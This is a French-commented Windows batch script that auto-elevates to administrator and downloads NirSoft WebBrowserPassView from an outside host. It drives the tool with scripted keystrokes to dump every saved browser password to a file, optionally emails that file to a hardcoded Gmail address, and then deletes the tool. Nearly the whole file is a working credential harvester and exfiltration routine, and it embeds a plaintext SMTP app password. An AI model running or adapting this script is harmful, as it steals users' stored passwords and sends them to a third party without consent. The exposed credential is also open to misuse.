@echo off
setlocal EnableExtensions EnableDelayedExpansion
chcp 65001 >nul
title Export mots de passe navigateurs (Nirsoft) - Standalone
color 0A

REM === AUTO-ELEVATION EN ADMINISTRATEUR ===
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Ce script requiert des privileges administrateur.
    echo Demande d'elevation en cours...
    timeout /t 2 >nul
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo ===============================================
echo   Export mots de passe navigateurs (Nirsoft)
echo ===============================================
echo.

set "WBPV=%~dp0WebBrowserPassView.exe"
set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"
set "EMAIL=alexandre.janacek@gmail.com"
set "DOWNLOADED=0"
set "SMTP_USER=alexandre.janacek@gmail.com"
set "SMTP_PASS=awneqcvfacvcfrzn"

:bpv_menu
cls
echo ===============================================
echo   WEBBROWSERPASSVIEW - EXPORT
echo ===============================================
echo.
echo   1) Enregistrement local uniquement
echo   2) Enregistrement et envoi par email
echo   0) Quitter
echo.
set /p bpv_choice=Votre choix:

if "%bpv_choice%"=="1" goto EXPORT
if "%bpv_choice%"=="2" goto EXPORT_AND_SEND
if "%bpv_choice%"=="0" goto exit_script
goto bpv_menu

:EXPORT
rem Telecharger si necessaire
if not exist "%WBPV%" (
  echo.
  echo Telechargement de WebBrowserPassView.exe...
  curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
  if not exist "%WBPV%" (
    echo Erreur: Telechargement echoue.
    pause
    goto bpv_menu
  )
  if %errorlevel% neq 0 (
    echo Erreur lors du telechargement.
    pause
    goto bpv_menu
  )
  set "DOWNLOADED=1"
  timeout /t 1 /nobreak >nul
)

rem Generer un nom de fichier unique
call :GET_UNIQUE_FILENAME
set "OUTPUT=%UNIQUE_FILE%"

echo.
echo Lancement de WebBrowserPassView...
start "" "%WBPV%"

timeout /t 5 /nobreak >nul

echo Traitement en cours...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1

timeout /t 3 /nobreak >nul

taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

rem Attendre que le processus se termine completement
timeout /t 2 /nobreak >nul

rem Nettoyage si telecharge
if "%DOWNLOADED%"=="1" (
  echo Nettoyage...
  del /F /Q "%WBPV%" >nul 2>&1
  if exist "%WBPV%" (
    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
  )
)

if exist "%OUTPUT%" (
  echo Termine. Fichier sauvegarde: %OUTPUT%
  echo.
  echo Retour au menu precedent dans 2 secondes...
  timeout /t 2 /nobreak >nul
  goto bpv_menu
) else (
  echo ERREUR: Le fichier n'a pas ete cree.
  pause
  goto bpv_menu
)

:EXPORT_AND_SEND
rem Telecharger si necessaire
if not exist "%WBPV%" (
  echo.
  echo Telechargement de WebBrowserPassView.exe...
  curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
  if not exist "%WBPV%" (
    echo Erreur: Telechargement echoue.
    pause
    goto bpv_menu
  )
  if %errorlevel% neq 0 (
    echo Erreur lors du telechargement.
    pause
    goto bpv_menu
  )
  set "DOWNLOADED=1"
  timeout /t 1 /nobreak >nul
)

rem Generer un nom de fichier unique
call :GET_UNIQUE_FILENAME
set "OUTPUT=%UNIQUE_FILE%"

echo.
echo Lancement de WebBrowserPassView...
start "" "%WBPV%"

timeout /t 5 /nobreak >nul

echo Traitement en cours...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1

timeout /t 3 /nobreak >nul

taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

rem Attendre que le processus se termine completement
timeout /t 2 /nobreak >nul

if not exist "%OUTPUT%" (
  echo ERREUR: Le fichier n'a pas ete cree.
  if "%DOWNLOADED%"=="1" (
    del /F /Q "%WBPV%" >nul 2>&1
    if exist "%WBPV%" (
      powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
    )
  )
  pause
  goto bpv_menu
)

echo Fichier sauvegarde: %OUTPUT%
echo.
echo Envoi du fichier par email...

powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att; Write-Host 'Email envoye avec succes!' -ForegroundColor Green"

rem Nettoyage si telecharge
if "%DOWNLOADED%"=="1" (
  echo.
  echo Nettoyage...
  del /F /Q "%WBPV%" >nul 2>&1
  if exist "%WBPV%" (
    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
  )
)

echo.
echo Fermeture automatique dans 2 secondes...
timeout /t 2 /nobreak >nul
goto bpv_menu

:GET_UNIQUE_FILENAME
set "BASE=%~dp0passwords_export"
set "EXT=.txt"
set "COUNTER=0"
set "UNIQUE_FILE=%BASE%%EXT%"

:CHECK_FILE
if exist "%UNIQUE_FILE%" (
  set /a COUNTER+=1
  set "UNIQUE_FILE=%BASE%_!COUNTER!%EXT%"
  goto CHECK_FILE
)
goto :eof

:exit_script
echo.
echo Fermeture du script...
pause
exit
